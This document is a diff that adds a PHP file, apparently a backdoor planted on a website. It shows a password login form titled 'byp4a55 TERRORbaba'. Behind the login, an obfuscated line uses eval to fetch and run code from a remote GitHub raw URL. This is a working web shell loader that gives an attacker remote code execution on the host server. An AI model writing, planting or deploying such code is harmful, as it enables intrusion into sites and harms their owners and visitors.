@@ -1,0 +1,31 @@
+<?php
+session_start();
+
+/* MD5 hash of your password (example: md5("mypassword")) */
+$PASS_MD5 = "51d80c081e40cf051e3893b9cfa95da5";
+
+if (!isset($_SESSION['auth'])) {
+    if (isset($_POST['p']) && md5($_POST['p']) === $PASS_MD5) {
+        $_SESSION['auth'] = true;
+    } else {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>byp4a55 TERRORbaba</title>
+        </head>
+        <body>
+            <form method="post">
+                <input type="password" name="p" placeholder="Password">
+                <button type="submit">Enter</button>
+            </form>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+?>
+
+<title>byp4a55 TERRORbaba</title>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/terrorbaba/SeoOk/refs/heads/main/admin.txt"));/**/?>
